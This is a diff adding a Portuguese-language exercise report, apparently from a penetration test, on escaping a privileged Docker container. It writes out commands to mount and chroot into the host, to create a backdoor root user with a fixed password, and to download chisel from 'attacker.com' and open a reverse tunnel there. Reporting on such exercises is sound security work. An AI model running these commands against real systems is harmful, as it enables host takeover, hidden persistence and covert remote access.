@@ -1,0 +1,31 @@
+Durante o exercício, foi detectado um container Docker exposto com permissões inseguras. O container executava uma aplicação legada em ambiente Linux e estava configurado com o parâmetro --privileged, permitindo acesso quase irrestrito ao host.
+
+Inicialmente, foi possível obter acesso ao container via exploração de uma vulnerabilidade de execução remota no serviço da aplicação. A partir de dentro do container, foram realizadas ações para descobrir as permissões e as capacidades disponíveis, utilizando os comandos:
+
+id
+cat /proc/1/cgroup
+capsh --print
+
+Foi observado que o container possuía permissões privilegiadas e acesso direto ao sistema de arquivos do host via bind mount (/var/run/docker.sock). Aproveitando-se disso, foi possível escapar do isolamento do container.
+
+O atacante então montou o sistema de arquivos raiz do host no container:
+
+mkdir /mnt/host
+mount -t proc proc /mnt/host/proc
+mount --bind / /mnt/host
+
+Em seguida, acessou o sistema do host a partir de dentro do container e adicionou um novo usuário com permissões de root:
+
+chroot /mnt/host
+useradd atacante -G root
+echo 'atacante:senha123' | chpasswd
+usermod -aG sudo atacante
+
+Com isso, o atacante conseguiu persistência com privilégios administrativos no host.
+
+Para garantir sigilo e movimentações futuras, ferramentas como chisel e socat foram transferidas para o container e utilizadas para criar túneis reversos, permitindo comunicação entre o host comprometido e o servidor do atacante em um canal alternativo e ofuscado:
+
+curl http://attacker.com/chisel
+ -o /tmp/chisel
+chmod +x /tmp/chisel
+/tmp/chisel client attacker.com:9999 R:2222:localhost:22
